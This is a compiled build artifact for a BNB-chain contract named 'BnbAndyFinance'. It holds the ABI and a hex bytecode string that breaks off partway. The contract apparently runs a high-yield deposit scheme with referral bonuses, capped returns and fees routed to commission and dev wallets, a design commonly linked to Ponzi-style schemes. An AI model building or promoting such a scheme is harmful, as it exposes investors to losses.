{
  "contractName": "BnbAndyFinance",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "wallet",
          "type": "address"
        },
        {
          "internalType": "address payable",
          "name": "dev_wallet",
          "type": "address"
        },
        {
          "internalType": "address payable",
          "name": "ins_wallet",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "user",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "totalAmount",
          "type": "uint256"
        }
      ],
      "name": "FeePayed",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "user",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint8",
          "name": "plan",
          "type": "uint8"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "NewDeposit",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "address",
          "name": "user",
          "type": "address"
        }
      ],
      "name": "Newbie",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "referrer",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "referral",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "uint256",
          "name": "level",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "RefBonus",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "user",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "Withdrawn",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "DEV_FEE",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "DEV_FEE_WT",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "INVEST_MIN_AMOUNT",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "PERCENTS_DIVIDER",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "PROJECT_FEE",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "PROJECT_FEE_WT",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "REFERRAL_PERCENTS",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "TIME_STEP",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "TOTAL_REF",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "available",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "commissionWallet",
      "outputs": [
        {
          "internalType": "address payable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "devWallet",
      "outputs": [
        {
          "internalType": "address payable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "insurance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "insuranceWallet",
      "outputs": [
        {
          "internalType": "address payable",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "last_deposit",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "started",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "totalInvested",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "isOwner",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "setInsurance",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "referrer",
          "type": "address"
        }
      ],
      "name": "invest",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdrawRef",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdrawns",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getContractBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "getPlanInfo",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "time",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "percent",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserDividends",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserActivePlansAmount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserTotalWithdrawn",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserCheckpoint",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserReferrer",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserDownlineCount",
      "outputs": [
        {
          "internalType": "uint256[2]",
          "name": "referrals",
          "type": "uint256[2]"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserTotalReferrals",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserReferralBonus",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserReferralTotalBonus",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserReferralWithdrawn",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserAvailable",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserAmountOfDeposits",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserTotalDeposits",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserDepositInfo",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "plan",
          "type": "uint8"
        },
        {
          "internalType": "uint256",
          "name": "percent",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "start",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "finish",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "index",
          "type": "uint256"
        }
      ],
      "name": "getUserActions",
      "outputs": [
        {
          "internalType": "uint8[]",
          "name": "",
          "type": "uint8[]"
        },
        {
          "internalType": "uint256[]",
          "name": "",
          "type": "uint256[]"
        },
        {
          "internalType": "uint256[]",
          "name": "",
          "type": "uint256[]"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserActionLength",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "getSiteInfo",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "_totalInvested",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "_totalBonus",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "userAddress",
          "type": "address"
        }
      ],
      "name": "getUserInfo",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "totalDeposit",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "totalWithdrawn",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "totalReferrals",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    }
  ],
  "bytecode": "0x60806040526040518060400160405280606460ff168152602001603260ff1681525060009060026200003392919062000205565b503480156200004157600080fd5b5060405162004a4638038062004a468339818101604052810190620000679190620002e5565b6200008183620001f2640100000000026401000000009004565b156200008c57600080fd5b33600760016101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555082600860006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555081600960006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600a60006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600260405180604001604052806101818152602001600781525090806001815401808255809150506001900390600052602060002090600202016000909190919091506000820151816000015560208201518160010155505050505062000341565b600080823b905060008111915050919050565b82805482825590600052602060002090810192821562000249579160200282015b8281111562000248578251829060ff1690559160200191906001019062000226565b5b5090506200025891906200025c565b5090565b5b80821115620002775760008160009055506001016200025d565b5090565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000620002ad8262000280565b9050919050565b620002bf81620002a0565b8114620002cb57600080fd5b50565b600081519050620002df81620002b4565b92915050565b6000806000606084860312156200030157620003006200027b565b5b60006200031186828701620002ce565b93505060206200032486828701620002ce565b92505060406200033786828701620002ce565b9150509250925092565b6146f580620003516000396000f3fe608060405260043610610284576000357c0100000000000000000000000000000000000000000000000000000000900480637e3abeea11610161578063c4716d76116100d3578063e85abe0911610097578063e85abe09146109a9578063f009086b146109e6578063f6b9177714610a23578063fb4cb32b14610a4e578063fbfcb27914610a8b578063fea3c34314610ac857610284565b8063c4716d76146108d6578063ca7dd83514610913578063d0c857e31461092a578063d7ffca9114610941578063e262113e1461097e57610284565b80639da44c9a116101255780639da44c9a146107855780639f1a3756146107b1578063a866bc75146107dc578063a8aeb6c214610819578063b3a7834d14610856578063be879b9d1461089757610284565b80637e3abeea1461069c5780638da5cb5b146106d95780638ea5220f146107045780638f32d59b1461072f57806397c0262a1461075a57610284565b806348c37203116101fa5780635216aeec116101be5780635216aeec14610583578063600d20ce146105ae5780636386c1c7146105eb5780636bb185561461062a5780636f9fb98a146106675780637b098ed61461069257610284565b806348c372031461049957806348d44bd1146104d65780634bc4e085146105015780634ce870531461052c5780635038e06c1461055857610284565b8063153ab9df1161024c578063153ab9df146103875780631f2698ab146103c457806332bc298c146103ef57806336144c9a1461041a5780633ccfd60b14610457578063436a88c11461046e57610284565b806301c234a81461028957806303a93c0c146102b457806303f9c793146102f1578063040a772e1461030d57806310098ad51461034a575b600080fd5b34801561029557600080fd5b5061029e610b05565b6040516102ab919061399b565b60405180910390f35b3480156102c057600080fd5b506102db60048036038101906102d69190613a19565b610b0b565b6040516102e89190613af1565b60405180910390f35b61030b60048036038101906103069190613a19565b610b98565b005b34801561031957600080fd5b50610334600480360381019061032f9190613a19565b611857565b604051610341919061399b565b60405180910390f35b34801561035657600080fd5b50610371600480360381019061036c9190613a19565b611b11565b60405161037e919061399b565b60405180910390f35b34801561039357600080fd5b506103ae60048036038101906103a99190613a19565b611b29565b6040516103bb919061399b565b60405180910390f35b3480156103d057600080fd5b506103d9611b55565b6040516103e69190613b27565b60405180910390f35b3480156103fb57600080fd5b50610404611b68565b604051610411919061399b565b60405180910390f35b34801561042657600080fd5b50610441600480360381019061043c9190613a19565b611b6f565b60405161044e9190613b51565b60405180910390f35b34801561046357600080fd5b5061046c611bdb565b005b34801561047a57600080fd5b506104836120e7565b604051610490919061399b565b60405180910390f35b3480156104a557600080fd5b506104c060048036038101906104bb9190613a19565b6120ec565b6040516104cd919061399b565b60405180910390f35b3480156104e257600080fd5b506104eb612138565b6040516104f8919061399b565b60405180910390f35b34801561050d57600080fd5b5061051661213d565b604051610523919061399b565b60405180910390f35b34801561053857600080fd5b50610541612142565b60405161054f929190613b6c565b60405180910390f35b34801561056457600080fd5b5061056d61217a565b60405161057a9190613bb6565b60405180910390f35b34801561058f57600080fd5b506105986121a0565b6040516105a5919061399b565b60405180910390f35b3480156105ba57600080fd5b506105d560048036038101906105d09190613bfd565b6121a6565b6040516105e2919061399b565b60405180910390f35b3480156105f757600080fd5b50610612600480360381019061060d9190613a19565b6121ca565b60405161062193929190613c2a565b60405180910390f35b34801561063657600080fd5b50610651600480360381019061064c9190613a19565b6121f7565b60405161065e919061399b565b60405180910390f35b34801561067357600080fd5b5061067c612297565b604051610689919061399b565b60405180910390f35b61069a6122b6565b005b3480156106a857600080fd5b506106c360048036038101906106be9190613a19565b612461565b6040516106d0919061399b565b60405180910390f35b3480156106e557600080fd5b506106ee612549565b6040516106fb9190613b51565b60405180910390f35b34801561071057600080fd5b50610719612573565b6040516107269190613bb6565b60405180910390f35b34801561073b57600080fd5b50610744612599565b6040516107519190613b27565b60405180910390f35b34801561076657600080fd5b5061076f6125f1565b60405161077c9190613bb6565b60405180910390f35b34801561079157600080fd5b5061079a612617565b6040516107a8929190613b6c565b60405180910390f35b3480156107bd57600080fd5b506107c6612670565b6040516107d3919061399b565b60405180910390f35b3480156107e857600080fd5b5061080360048036038101906107fe9190613a19565b612675565b604051610810919061399b565b60405180910390f35b34801561082557600080fd5b50610840600480360381019061083b9190613a19565b6126c4565b60405161084d919061399b565b60405180910390f35b34801561086257600080fd5b5061087d60048036038101906108789190613a19565b612713565b60405161088e959493929190613c7d565b60405180910390f35b3480156108a357600080fd5b506108be60048036038101906108b99190613cd0565b6128d1565b6040516108cd93929190613e65565b60405180910390f35b3480156108e257600080fd5b506108fd60048036038101906108f89190613a19565b612c03565b60405161090a919061399b565b60405180910390f35b34801561091f57600080fd5b50610928612c1b565b005b34801561093657600080fd5b5061093f61305b565b005b34801561094d57600080fd5b5061096860048036038101906109639190613a19565b613144565b604051610975919061399b565b60405180910390f35b34801561098a57600080fd5b50610993613190565b6040516109a0919061399b565b60405180910390f35b3480156109b557600080fd5b506109d060048036038101906109cb9190613a19565b61319b565b6040516109dd919061399b565b60405180910390f35b3480156109f257600080fd5b50610a0d6004803603810190610a089190613a19565b6131e7565b604051610a1a919061399b565b60405180910390f35b348015610a2f57600080fd5b50610a386133e6565b604051610a45919061399b565b60405180910390f35b348015610a5a57600080fd5b50610a756004803603810190610a709190613a19565b6133eb565b604051610a82919061399b565b60405180910390f35b348015610a9757600080fd5b50610ab26004803603810190610aad9190613a19565b613437565b604051610abf919061399b565b60405180910390f35b348015610ad457600080fd5b50610aef6004803603810190610aea9190613a19565b6134f8565b604051610afc919061399b565b60405180910390f35b6103e881565b610b13613960565b600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600301600280602002604051908101604052809291908260028015610b8c576020028201915b815481526020019060010190808311610b78575b50505050509050919050565b6000600760009054906101000a900460ff16610c5f57600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1603610c23576001600760006101000a81548160ff021916908315150217905550610c5e565b6040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c5590613f0e565b60405180910390fd5b5b662386f26fc10000341015610c7357600080fd5b6000600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610d08600a600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461351090919063ffffffff16565b610d129190613f5d565b9050803411610d208261356e565b604051602001610d309190614074565b60405160208183030381529060405290610d80576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d7791906140e0565b60405180910390fd5b5060018260ff1610610dc7576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610dbe9061414e565b60405180910390fd5b6000610df16103e8610de3601e3461363c90919063ffffffff16565b61351090919063ffffffff16565b90506000610e1d6103e8610e0f60143461363c90919063ffffffff16565b61351090919063ffffffff16565b9050600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f19350505050158015610e87573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f2899dc8c12def1caa9accb64257cf2fd9f960f21bb27a560a757eae3c2ec43c183604051610ece919061399b565b60405180910390a2600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015610f3e573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f2899dc8c12def1caa9accb64257cf2fd9f960f21bb27a560a757eae3c2ec43c182604051610f85919061399b565b60405180910390a26000600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000209050600073ffffffffffffffffffffffffffffffffffffffff168160020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16036112a2576000600360008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600001805490501180156110a957503373ffffffffffffffffffffffffffffffffffffffff168673ffffffffffffffffffffffffffffffffffffffff1614155b156110f257858160020160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b60008160020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060005b600281101561129f57600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614611287576111c46001600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030183600281106111b4576111b361416e565b5b01546136b690919063ffffffff16565b600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030182600281106112185761121761416e565b5b0181905550600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16915061128c565b61129f565b80806112979061419d565b91505061111e565b50505b600073ffffffffffffffffffffffffffffffffffffffff168160020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16146115ce5760008160020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060005b60028110156115cb57600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16146115b35760006113aa6103e861139c600085815481106113825761138161416e565b5b90600052602060002001543461363c90919063ffffffff16565b61351090919063ffffffff16565b905061140181600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501546136b690919063ffffffff16565b600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206005018190555061149c81600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601546136b690919063ffffffff16565b600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060060181905550813373ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fd41f7e766eebcc7ff42b11ac8691bdf864db4afc0c55e71d629d54edce460d9884604051611540919061399b565b60405180910390a4600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169250506115b8565b6115cb565b80806115c39061419d565b915050611326565b50505b600081600001805490500361161e574281600101819055507f9fd565cd14c3c391679eb0cad12a14dcf7534e9d3462bcb9b67a098a9bbbc24a336040516116159190613b51565b60405180910390a15b8060000160405180606001604052808760ff16815260200134815260200142815250908060018154018082558091505060019003906000526020600020906003020160009091909190915060008201518160000160006101000a81548160ff021916908360ff16021790555060208201518160010155604082015181600201555050806008016040518060600160405280600060ff16815260200134815260200142815250908060018154018082558091505060019003906000526020600020906003020160009091909190915060008201518160000160006101000a81548160ff021916908360ff1602179055506020820151816001015560408201518160020155505034600460003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061178f606461178161010e3461363c90919063ffffffff16565b61351090919063ffffffff16565b600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546117dd9190613f5d565b925050819055506117f9346001546136b690919063ffffffff16565b6001819055503373ffffffffffffffffffffffffffffffffffffffff167f3a89eb89956dcf6537585a2372d4e629e18622cce06c2b4fee6301ae0840e24186346040516118479291906141e5565b60405180910390a2505050505050565b600080600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000209050600080600090505b8260000180549050811015611b0657600061195f6119296201518060028760000186815481106118d6576118d561416e565b5b906000526020600020906003020160000160009054906101000a900460ff1660ff16815481106119095761190861416e565b5b90600052602060002090600202016000015461363c90919063ffffffff16565b85600001848154811061193f5761193e61416e565b5b9060005260206000209060030201600201546136b690919063ffffffff16565b90508084600101541015611af2576000611a196103e8611a0b60028860000187815481106119905761198f61416e565b5b906000526020600020906003020160000160009054906101000a900460ff1660ff16815481106119c3576119c261416e565b5b9060005260206000209060020201600101548860000187815481106119eb576119ea61416e565b5b90600052602060002090600302016001015461363c90919063ffffffff16565b61351090919063ffffffff16565b905060008560010154866000018581548110611a3857611a3761416e565b5b90600052602060002090600302016002015411611a59578560010154611a82565b856000018481548110611a6f57611a6e61416e565b5b9060005260206000209060030201600201545b90506000428410611a935742611a95565b835b905080821015611aee57611aeb611adc62015180611ace611abf868661371490919063ffffffff16565b8761363c90919063ffffffff16565b61351090919063ffffffff16565b876136b690919063ffffffff16565b95505b5050505b508080611afe9061419d565b9150506118a3565b508092505050919050565b60066020528060005260406000206000915090505481565b6000611b4e611b3783611857565b611b408461319b565b6136b690919063ffffffff16565b9050919050565b600760009054906101000a900460ff1681565b6201518081565b6000600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b7f9fd565cd14c3c391679eb0cad12a14dcf7534e9d3462bcb9b67a098a9bbbc24a33604051611c0a9190613b51565b60405180910390a16000600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002090506000611c6033611857565b90506000600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905080821115611cb2578091505b6000611cdc6103e8611cce60288661363c90919063ffffffff16565b61351090919063ffffffff16565b90506000611d086103e8611cfa600a8761363c90919063ffffffff16565b61351090919063ffffffff16565b9050600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f19350505050158015611d72573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f2899dc8c12def1caa9accb64257cf2fd9f960f21bb27a560a757eae3c2ec43c183604051611db9919061399b565b60405180910390a2600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015611e29573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f2899dc8c12def1caa9accb64257cf2fd9f960f21bb27a560a757eae3c2ec43c182604051611e70919061399b565b60405180910390a260008411611ebb576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611eb29061425a565b60405180910390fd5b428560010181905550611edb8486600701546136b690919063ffffffff16565b85600701819055506000611f1e611f0f6064611f0160058961363c90919063ffffffff16565b61351090919063ffffffff16565b8661371490919063ffffffff16565b90503373ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015611f66573d6000803e3d6000fd5b5084600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254611fb6919061427a565b925050819055506000600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020540361200e5761200d33613773565b5b856008016040518060600160405280600160ff16815260200187815260200142815250908060018154018082558091505060019003906000526020600020906003020160009091909190915060008201518160000160006101000a81548160ff021916908360ff160217905550602082015181600101556040820151816002015550503373ffffffffffffffffffffffffffffffffffffffff167f7084f5476618d8e60b11ef0d7d3f06914655adb8793e28ff7f018d4c76d505d5866040516120d7919061399b565b60405180910390a2505050505050565b601481565b60006003600083